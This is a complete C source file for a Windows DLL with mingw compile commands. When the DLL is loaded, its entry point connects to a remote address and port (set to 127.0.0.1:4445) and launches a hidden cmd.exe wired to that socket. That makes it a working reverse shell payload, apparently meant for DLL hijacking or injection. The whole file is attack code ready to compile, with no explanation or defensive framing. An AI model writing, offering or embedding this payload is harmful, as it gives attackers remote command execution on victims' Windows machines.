// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
void socketfunc(void);

#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
void socketfunc(void)
{
	//FreeConsole();
	const char* REMOTE_ADDR = "127.0.0.1";
	unsigned short REMOTE_PORT = 4445;
	WSADATA wsaData;
	SOCKET wSock;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct sockaddr_in sockinfo;
	//memset(&sockinfo, 0, sizeof(sockinfo))
	// create socket
	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	sockinfo.sin_family = AF_INET;
	sockinfo.sin_port = htons(REMOTE_PORT);
	sockinfo.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
	// connect to remote host
	WSAConnect(wSock, (SOCKADDR*)&sockinfo, sizeof(sockinfo), NULL, NULL, NULL, NULL);

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES;
	//si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)wSock;
	si.hStdOutput = (HANDLE)wSock;
	si.hStdError = (HANDLE)wSock;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	//WaitForSingleObject(pi.hProcess, INFINITE);
	//CloseHandle(pi.hProcess);
	//CloseHandle(pi.hThread);
	//WSACleanup();
}



BOOL APIENTRY DllMain (HANDLE hdll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
    case DLL_PROCESS_ATTACH:
        socketfunc();
    }
    return TRUE;
}
